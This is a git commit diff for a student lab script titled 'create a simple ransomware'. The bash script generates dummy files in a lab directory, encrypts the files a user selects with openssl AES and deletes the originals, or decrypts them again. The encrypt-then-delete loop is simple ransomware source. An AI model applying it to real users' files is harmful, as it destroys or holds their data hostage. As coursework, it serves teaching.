d5d979fd8cd0adbd5d141e75f1c03ac6f89147a0
nickpap556@gmail.com <nick@ohno.localdomain>
2021-12-12 16:59:35 +0200

    working bash script for multiple files all actions

--- lab5/ransomware.sh
+++ lab5/ransomware.sh
@@ -5,7 +5,10 @@
 # Lab no. 5
 # "create a simple ransomware"
 
-FILEDIR = /tmp/
+FILEDIR=/tmp/lab5_files/
+
+# create the directory, if it does not already exist
+mkdir -p $FILEDIR
 
 echo -n "Enter 0 to create, 1 to encrypt, and 2  to decrypt files: "
 read choice
@@ -13,28 +16,30 @@ read choice
 if [[ $choice -eq 2 ]]
 then
 	echo " **decryption mode**"
-	echo -e "enter the input filename(or filenames, with wildcards): "
+	echo -e "enter the input filename(or filenames, ls with wildcards): "
 	read input
 	echo -e "enter password: "
 	read pass
 	#openssl aes-256-ecb -in $input -out $input.dec  -d -k $pass
-	for FILE in $(ls $input)
+	for FILE in $(ls $FILEDIR$input)  
 	do
-		openssl aes-256-ecb -in $FILEDIR$FILE -out $FILEDIR$FILE.dec -d -k $pass
+		openssl aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.dec -d -k $pass 
+		rm $FILE
 	done
 
 
 elif [[ $choice -eq 1 ]]
 then 
 	echo " **encryption mode**"
-	echo -e "enter the input filename: "
+	echo -e "enter the input filename(or filenames, with ls wildcards): "
 	read input
 	echo -e "enter password: "
 	read pass
 	#openssl enc -aes-256-ecb -in $input -out $input.enc  -k $pass
-	for FILE in $(ls $input)
+	for FILE in $(ls $FILEDIR$input)
         do
-                openssl enc -aes-256-ecb -in $FILEDIR$FILE -out $FILEDIR$FILE.enc -k $pass
+                openssl enc -aes-256-ecb -pbkdf2 -iter 1000 -in $FILE -out $FILE.enc -k $pass 
+		rm $FILE
         done
 elif [[ $choice -eq 0  ]]
 then
@@ -46,6 +51,7 @@ then
 	do
 		# here we print a random string in the files specified
 		tr -dc A-Za-z0-9 </dev/urandom | head -c 13 > $FILEDIR$filename$number
+		echo "$FILEDIR$filename$number"
 	done
 else
 	echo "Wrong Option"
